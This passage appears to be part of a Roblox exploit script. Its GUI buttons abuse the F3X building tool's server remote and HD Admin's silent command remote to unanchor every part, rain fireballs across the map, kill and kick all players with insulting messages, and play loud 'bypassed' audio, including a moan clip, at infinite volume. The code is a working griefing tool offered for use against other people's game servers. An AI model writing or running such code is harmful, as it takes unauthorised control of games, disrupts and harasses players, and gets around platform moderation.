				LightType = "SpotLight",

				Brightness = brightness

			}

		}

	}

	_(args)

end

function Unanchor()

	for _, v in workspace:GetDescendants() do

		if v:IsA("BasePart") then

			task.spawn(function()

				SetLocked(v, false)

				SetAnchor(false, v)

			end)

		end

	end

end

Unanchor() end},
    {Name = "Explode random", Callback = function() local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack

-- Get F3X
local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then return v end
	end
	return nil
end

local f3x = getf3x()
if not f3x then
	warn("No F3X found!")
	return
end

local remote = f3x.SyncAPI.ServerEndpoint
local function invokeServer(...)
	return remote:InvokeServer(...)
end

-- Helpers
local function createPart(cf)
	return invokeServer("CreatePart", "Normal", cf, workspace)
end

local function resize(part, size)
	invokeServer("SyncResize", {{Part = part, CFrame = part.CFrame, Size = size}})
end

local function color(part, color3)
	invokeServer("SyncColor", {{Part = part, Color = color3, UnionColoring = false}})
end

local function addFire(part, size, heat)
	invokeServer("CreateDecorations", {{Part = part, DecorationType = "Fire"}})
	invokeServer("SyncDecorate", {{
		Part = part,
		DecorationType = "Fire",
		Size = size,    -- BIGGER FIRE SIZE
		Heat = heat     -- HOTTER FIRE
	}})
end

local function addLight(part, brightness, color)
	invokeServer("CreateLights", {{Part = part, LightType = "PointLight"}})
	invokeServer("SyncLighting", {{
		Part = part,
		LightType = "PointLight",
		Brightness = brightness,
		Color = color
	}})
end

local function anchor(part, anchored)
	invokeServer("SyncAnchor", {{Part = part, Anchored = anchored}})
end

local function destroy(part)
	invokeServer("Remove", {part})
end

-- Explosion fireball (NO visible cube)
local function spawnFireball(pos)
	local part = createPart(CFrame.new(pos))
	if not part then return end
	
	-- Make it tiny & black so it’s invisible
	resize(part, Vector3.new(0.1, 0.1, 0.1))
	color(part, Color3.new(0,0,0))
	anchor(part, true)
	
	-- BIG fireball + intense heat
	addFire(part, 80, 100)         -- way bigger than default
	addLight(part, 50, Color3.new(1, 0.4, 0)) -- bright flash
	
	-- Remove quickly for flash effect
	task.delay(0.4, function()
		destroy(part)
	end)
end

-- Loop: many random fireballs around player
local root = char:WaitForChild("HumanoidRootPart")

while task.wait(0.08) do
	for _ = 1, 6 do
		task.spawn(function()
			local x = root.Position.X + math.random(-300, 300)
			local y = root.Position.Y + math.random(100, 400)
			local z = root.Position.Z + math.random(-300, 300)
			spawnFireball(Vector3.new(x, y, z))
		end)
	end
end end},
    {Name = "Kill all", Callback = function() local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
local player = Players.LocalPlayer
SilentRequest:InvokeServer(";kill all")
end}
})

makeRow({
    {Name = "raining fire", Callback = function() local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- Locate SyncAPI tool
local tool
for _, v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for _, v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

if not tool then
    warn("No F3X tool found!")
    return
end

local remote = tool.SyncAPI.ServerEndpoint
local function call(args)
    remote:InvokeServer(unpack(args))
end

-- F3X helpers
local function CreatePart(cf)
    return remote:InvokeServer("CreatePart", "Normal", cf, workspace)
end

local function Resize(part, size)
    call({"SyncResize", {{Part = part, CFrame = part.CFrame, Size = size}}})
end

local function SetShape(part, shape)
    call({"SyncShape", {{Part = part, Shape = shape}}})
end

local function SetCollision(part, bool)
    call({"SyncCollision", {{Part = part, CanCollide = bool}}})
end

local function Anchor(part, bool)
    call({"SyncAnchor", {{Part = part, Anchored = bool}}})
end

local function AddFire(part)
    call({"CreateDecorations", {{Part = part, DecorationType = "Fire"}}})
    call({"SyncDecorate", {{
        Part = part,
        DecorationType = "Fire",
        Size = 25,
        Heat = 30
    }}})
end

local function SetColor(part, color3)
    call({"SyncColor", {{
        Part = part,
        Color = color3,
        UnionColoring = false
    }}})
end

-- Fire rain loop
local root = char:WaitForChild("HumanoidRootPart")

while task.wait(0.25) do
    -- Random position above player
    local x = root.Position.X + math.random(-300, 300)
    local z = root.Position.Z + math.random(-300, 300)
    local y = root.Position.Y + math.random(250, 500)
    local cf = CFrame.new(x, y, z)

    task.spawn(function()
        -- Create part and get reference
        local newPart = CreatePart(cf)
        task.wait(0.2) -- allow part to exist
        
        -- Find the new part near spawn location
        for _, v in workspace:GetChildren() do
            if v:IsA("Part") and (v.Position - cf.Position).Magnitude < 5 then
                -- Make it a meteor fireball
                Resize(v, Vector3.new(10, 10, 10)) -- medium meteor size
                SetShape(v, Enum.PartType.Ball)
                SetColor(v, Color3.new(0, 0, 0)) -- BLACK meteor
                AddFire(v)

                -- ✅ Let gravity drop it, and let it HIT the ground
                SetCollision(v, true)   -- collide with floor
                Anchor(v, false)        -- unanchored so it falls
                
                break
            end
        end
    end)
end end},
    {Name = "Shutdown", Callback = function() local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
local player = Players.LocalPlayer

-- Kick everyone else
SilentRequest:InvokeServer(";kick all DIS GAME IS RECKED!")

-- Wait 2 seconds
task.wait(2)

-- Kick yourself
player:Kick("THIS GAME IS FUCKED UP!") end},
    {Name = "disco", Callback = function()  local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";disco") end}
})

-- Section label
local audioLabel = Instance.new("TextLabel")
audioLabel.Size = UDim2.new(1, 0, 0, 25)
audioLabel.BackgroundTransparency = 1
audioLabel.Text = "-- BYPASSED AUDIOS --"
audioLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
audioLabel.TextScaled = true
audioLabel.Font = Enum.Font.SourceSansBold
audioLabel.Parent = scrollFrame

-- Audio row
makeRow({
    {Name = "c00l music", Callback = function() local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 109008039044385")
SilentRequest:InvokeServer(";pitch 0.090")
SilentRequest:InvokeServer(";volume inf") end},
    {Name = "blood pop", Callback = function() local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 133251269532695")
SilentRequest:InvokeServer(";pitch 0.143")
SilentRequest:InvokeServer(";volume inf") end},
    {Name = "loud ass moan", Callback = function() local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";music 115508342066719")
SilentRequest:InvokeServer(";volume inf") end}
})